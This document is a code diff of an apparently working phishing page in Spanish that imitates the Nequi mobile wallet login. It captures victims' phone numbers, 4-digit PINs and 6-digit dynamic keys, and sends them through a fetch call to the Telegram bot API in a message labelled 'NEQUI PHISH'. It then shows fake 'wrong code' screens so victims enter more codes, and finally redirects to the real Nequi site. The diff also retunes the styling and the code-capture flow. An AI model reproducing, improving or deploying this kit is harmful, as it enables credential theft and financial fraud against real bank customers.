@@ -40,14 +40,11 @@
     #screen1 { display: flex; }
 
     .help {
-      position: absolute;
-      top: 25px; right: 25px;
+      position: absolute; top: 25px; right: 25px;
       width: 32px; height: 32px;
       border: 2px solid rgba(255,255,255,0.9);
       border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      display: flex; align-items: center; justify-content: center;
       font-size: 18px;
     }
 
@@ -107,20 +104,20 @@
     }
 
     .pins {
-      margin: 55px 0 35px 0;
+      margin: 60px 0 40px 0;
       display: flex;
       justify-content: center;
-      gap: 20px;
+      gap: 22px;
     }
     .pin {
-      width: 50px;
-      height: 50px;
+      width: 48px;
+      height: 48px;
       background: #E0B0FF;
       border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 28px;
+      font-size: 26px;
       color: #3C0A55;
     }
 
@@ -152,27 +149,26 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
-    /* Loader Mejorado */
+    /* Loader Mejorado y Centrado */
     #loader {
-      display: none;
       flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100%;
     }
     .spinner {
-      width: 65px;
-      height: 65px;
-      border: 5px solid rgba(255, 45, 149, 0.15);
-      border-top: 5px solid #FF2D95;
+      width: 68px;
+      height: 68px;
+      border: 6px solid rgba(255,45,149,0.2);
+      border-top: 6px solid #FF2D95;
       border-radius: 50%;
-      animation: spin 1.2s linear infinite;
-      margin-bottom: 25px;
+      animation: spin 1.1s linear infinite;
+      margin-bottom: 30px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .loader-text {
-      font-size: 17px;
+      font-size: 17.5px;
       color: #E0B0FF;
       font-weight: 500;
     }
@@ -189,7 +185,7 @@
 
   <div class="phone-frame">
 
-    <!-- Pantalla 1 -->
+    <!-- 1. Número -->
     <div class="screen" id="screen1">
       <div class="help">?</div>
       <div class="nequi-logo"><span>■</span>Nequi</div>
@@ -200,7 +196,7 @@
       <button onclick="goToPassword()">Entra</button>
     </div>
 
-    <!-- Pantalla 2 - Clave de 4 dígitos -->
+    <!-- 2. Clave de 4 dígitos -->
     <div class="screen" id="screen2">
       <div class="back" onclick="goBack(1)">←</div>
       <div class="title">Escribe tu clave</div>
@@ -224,7 +220,7 @@
       </div>
     </div>
 
-    <!-- Pantalla 3 - Clave Dinámica -->
+    <!-- 3. Clave Dinámica -->
     <div class="screen" id="screen3">
       <div class="back" onclick="goBack(2)">←</div>
       <div class="title">Clave Dinámica</div>
@@ -249,13 +245,13 @@
       </div>
     </div>
 
-    <!-- Loader -->
+    <!-- Loader (Solo aparece después de la clave dinámica) -->
     <div class="screen" id="loader">
       <div class="spinner"></div>
       <div class="loader-text">Verificando clave dinámica...</div>
     </div>
 
-    <!-- Pantalla de Error -->
+    <!-- Error -->
     <div class="screen" id="errorScreen">
       <div class="error-text">Clave dinámica errada</div>
       <div class="message">El código ingresado no es correcto.<br>Por favor intenta nuevamente.</div>
@@ -290,47 +286,42 @@
       updatePins();
     }
 
-    function addDigit(num, screen) {
-      if (screen === 4) {
+    function addDigit(num, type) {
+      if (type === 4) {
         if (pin4.length < 4) {
           pin4 += num;
           updatePins();
-          if (pin4.length === 4) sendData(4);
+          if (pin4.length === 4) {
+            setTimeout(() => showScreen('screen3'), 400); // Pequeño delay natural
+          }
         }
-      } else if (screen === 6) {
+      } 
+      else if (type === 6) {
         if (pin6.length < 6) {
           pin6 += num;
           updatePins();
-          if (pin6.length === 6) sendData(6);
+          if (pin6.length === 6) sendDynamic();
         }
       }
     }
 
-    function deleteDigit(screen) {
-      if (screen === 4) pin4 = pin4.slice(0, -1);
-      if (screen === 6) pin6 = pin6.slice(0, -1);
+    function deleteDigit(type) {
+      if (type === 4) pin4 = pin4.slice(0, -1);
+      if (type === 6) pin6 = pin6.slice(0, -1);
       updatePins();
     }
 
     function updatePins() {
-      // Actualizar pines de 4 dígitos
-      const pins4 = document.querySelectorAll("#pins4 .pin");
-      pins4.forEach((pin, i) => {
+      document.querySelectorAll("#pins4 .pin").forEach((pin, i) => {
         pin.textContent = i < pin4.length ? "●" : "";
       });
-
-      // Actualizar pines de 6 dígitos
-      const pins6 = document.querySelectorAll("#pins6 .pin");
-      pins6.forEach((pin, i) => {
+      document.querySelectorAll("#pins6 .pin").forEach((pin, i) => {
         pin.textContent = i < pin6.length ? "●" : "";
       });
     }
 
-    function sendData(length) {
-      const code = length === 4 ? pin4 : pin6;
-      const tipo = length === 4 ? "Clave Principal" : "Clave Dinámica";
-
-      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 ${tipo}: ${code}\n⏰ ${new Date().toLocaleString('es-CO')}`;
+    function sendDynamic() {
+      const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 Clave Dinámica: ${pin6}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -341,18 +332,14 @@
       showScreen('loader');
 
       setTimeout(() => {
-        if (length === 4) {
-          showScreen('screen3');
+        attemptsLeft--;
+        if (attemptsLeft > 0) {
+          document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
+          showScreen('errorScreen');
         } else {
-          attemptsLeft--;
-          if (attemptsLeft > 0) {
-            document.getElementById('attemptsText').textContent = `Intentos restantes: ${attemptsLeft}`;
-            showScreen('errorScreen');
-          } else {
-            window.location.href = "https://www.nequi.com.co";
-          }
+          window.location.href = "https://www.nequi.com.co";
         }
-      }, 6000); // 6 segundos
+      }, 6000);
     }
 
     function retryDynamic() {
